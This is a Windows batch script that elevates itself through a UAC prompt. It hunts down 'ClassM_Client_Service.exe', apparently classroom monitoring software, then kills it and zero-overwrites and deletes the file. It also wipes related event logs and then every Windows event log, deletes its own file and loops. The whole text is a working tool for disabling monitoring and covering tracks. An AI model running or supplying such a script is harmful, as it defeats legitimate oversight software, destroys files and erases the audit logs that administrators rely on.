@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:loop
for /f "delims=" %%i in ('dir /s /b c:\ClassM_Client_Service.exe 2^>nul') do (
    taskkill /f /im "ClassM_Client_Service.exe" >nul 2>&1
    fsutil file setzerodata offset=0 length=999999999 "%%i" >nul 2>&1
    del /f /q "%%i" >nul 2>&1
    wevtutil el | findstr /i "ClassM" >nul && (
        for /f "delims=" %%j in ('wevtutil el ^| findstr /i "ClassM"') do (
            wevtutil cl "%%j" >nul 2>&1
        )
    )
)

for /f "delims=" %%k in ('wevtutil el') do (
    wevtutil cl "%%k" >nul 2>&1
)

del /f /q "%~f0" >nul 2>&1

timeout /t 0 /nobreak >nul
goto loop